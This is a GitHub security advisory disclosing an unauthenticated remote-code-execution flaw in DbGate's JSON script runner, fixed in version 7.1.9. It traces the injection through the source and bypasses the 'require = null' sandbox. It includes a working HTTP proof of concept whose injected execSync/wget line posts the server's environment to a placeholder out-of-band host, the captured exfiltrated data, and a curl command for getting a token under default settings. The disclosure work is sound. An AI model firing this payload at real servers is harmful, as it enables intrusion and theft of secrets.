# [C] DbGate: Unauthenticated Remote Code Execution via JSON Script Runner

## Summary
Severity: Critical
Advisory: GHSA-8v3q-9vmx-36vc
CVE: CVE-2026-47668
CWE: CWE-1188, CWE-20, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-05
Source: https://github.com/advisories/GHSA-8v3q-9vmx-36vc
Type: github-advisory

## Affected
- npm: `dbgate-serve` — affected >=0 <7.1.9

## Details
### Summary
DbGate's JSON script runner (`POST /runners/start`) allows remote code execution via code injection in the `functionName` parameter of JSON script `assign` commands. The `functionName` value is interpolated directly into dynamically generated JavaScript source code via string concatenation. The generated code is then executed in a forked Node.js child process.

### Details
#### Step 1: User Input Entry Point

**File:** `packages/api/src/controllers/runners.js` - `start()` method

The `/runners/start` endpoint accepts a POST body containing a `script` object. When `script.type == 'json'`, the request follows a different code path than raw shell scripts:

```javascript
async start({ script }, req) {
    if (script.type == 'json') {
        if (!platformInfo.isElectron) {
            if (!checkSecureDirectoriesInScript(script)) {
                return { errorMessage: 'Unallowed directories in script' };
            }
        }
        logJsonRunnerScript(req, script);
        const js = await jsonScriptToJavascript(script);
        return this.startCore(runid, scriptTemplate(js, false));
    }
```
This path skips:
1. The `run-shell-script` permission check
2. The `allowShellScripting` platform-level check

The only validation performed is `checkSecureDirectoriesInScript()`, which `props.fileName` values

---

#### Step 2: JSON-to-JavaScript Conversion (Injection Point)

**File:** `packages/tools/src/ScriptWriter.ts` - `assignCore()` method

The JSON script's `commands` array contains objects with `type: "assign"`. The `assignCore` method generates JavaScript by direct string concatenation of user-controlled values:

```typescript
assignCore(variableName, functionName, props) {
    this._put(`const ${variableName} = await ${functionName}(${JSON.stringify(props)});`);
}
```

Both `variableName` and `functionName` are attacker-controlled values taken directly from the JSON request body and interpolated into the generated JavaScript source code.

---

#### Step 3: Function Name Compilation

**File:** `packages/tools/src/packageTools.ts` - `compileShellApiFunctionName()`

Before interpolation, `functionName` passes through this function:

```typescript
export function compileShellApiFunctionName(functionName) {
    const nsMatch = functionName.match(/^([^@]+)@([^@]+)/);
    if (nsMatch) {
        return `${_camelCase(nsMatch[2])}.shellApi.${nsMatch[1]}`;
    }
    return `dbgateApi.${functionName}`;
}
```

An attacker supplying `functionName: "x;MALICIOUS_CODE;//"` gets:
```
dbgateApi.x;MALICIOUS_CODE;//
```

This is syntactically valid JavaScript: `dbgateApi.x` evaluates (and is discarded), `MALICIOUS_CODE` executes, and `//` comments out the trailing `(${JSON.stringify(props)});`.

---

#### Step 4: Generated JavaScript Template

The complete generated script that gets executed:

```javascript
const dbgateApi = require(process.env.DBGATE_API);
require = null;
async function run() {
    const x = await dbgateApi.x;process.mainModule.require('child_process').execSync('wget <attacker host>');//({});
    await dbgateApi.finalizer.run();
}
dbgateApi.runScript(run);
```

#### Step 5: Execution via child_process.fork()

**File:** `packages/api/src/controllers/runners.js` - `startCore()` method

The generated JavaScript string is written to a temporary file and executed as a new Node.js process via `child_process.fork()`. This provides the attacker with a full Node.js runtime, including access to `process`, `child_process`, `fs`, `net`, and all other Node.js built-in modules.

The `require = null` sandbox can be bypassed via:
- `process.mainModule.require()` - separate reference unaffected by the null assignment
- `module.constructor._load()` - internal module loader, also unaffected
---

#### Additional Injection Points

The same unsanitised string interpolation pattern exists in:

| Endpoint | Parameter | File |
|----------|-----------|------|
| `POST /runners/start` | `functionName` in assign commands | `ScriptWriter.ts` - `assignCore()` |
| `POST /runners/start` | `variableName` in assign commands | `ScriptWriter.ts` - `assignCore()` |
| `POST /runners/load-reader` | `functionName` parameter | `ScriptWriter.ts` - `loaderScriptTemplate` |

### PoC
```http
POST /runners/start HTTP/1.1
Host: <dbgate-instance>:3000
Authorization: Bearer <token>
Content-Type: application/json

{
  "script": {
    "type": "json",
    "commands": [
      {
        "type": "assign",
        "variableName": "x",
        "functionName": "x;process.mainModule.require('child_process').execSync('wget --post-data \"$(env 2>1&)\" <out of band host>');//",
        "props": {}
      }
    ],
    "packageNames": []
  }
}
```

The request to the out of band host was as follows:

```http
POST / HTTP/1.1
Host: <out of band host>
User-Agent: Wget/1.21.3
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 251

NODE_VERSION=22.22.2
HOSTNAME=4714c7a7405f
YARN_VERSION=1.22.22
HOME=/root
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DBGATE_API=/home/dbgate-docker/bundle.js
PWD=/root/.dbgate/run/16c2e85a-8512-4a7e-8678-391637bbdc2c
```

---

A bearer token is required to reach the endpoint, but in what appears to be the default deployment, authentication is disabled. Authentication needs to be explicitly set via environment variables. If this has not been explicitly set, per the defaults, a token can be retrieved using:

```bash
curl -sk -H "Content-Type: application/json"   -d '{"amoid":"none"}'   <dbgate-instance>:3000/auth/login
```

### Impact

| Scenario | Impact | CVSS Score | CVSS Vector | 
|----------|--------|--------|--------|
| Anonymous auth mode (default deployment) (`authProvider: "Anonymous"`) | Unauthenticated RCE | 10.0 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| Authenticated deployment | Authenticated RCE - any user with API access |  9.9 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H |

### Timeline

| Date | Event |
|------|-------|
| 2026-03-31 | Vulnerability discovered |
| 2026-04-07 | Advisory report prepared and submitted to maintainer |
| 2026-04-22 | Fix released (v7.1.9) |
| 2026-04-24 | Maintainer acknowledgment |
| 2026-05-20 | Public disclosure |

### Acknowledgements

- Discovery assisted by Neo from @ProjectDiscovery
- Initial research direction inspired by @H0j3n — https://github.com/runZeroInc/nuclei-templates/blob/main/http/vulnerabilities/dbgate-unauth-rce.yaml

## References
- https://github.com/dbgate/dbgate/security/advisories/GHSA-8v3q-9vmx-36vc
- https://github.com/dbgate/dbgate
- https://github.com/dbgate/dbgate/releases/tag/v7.1.9
- https://github.com/runZeroInc/nuclei-templates/blob/main/http/vulnerabilities/dbgate-unauth-rce.yaml
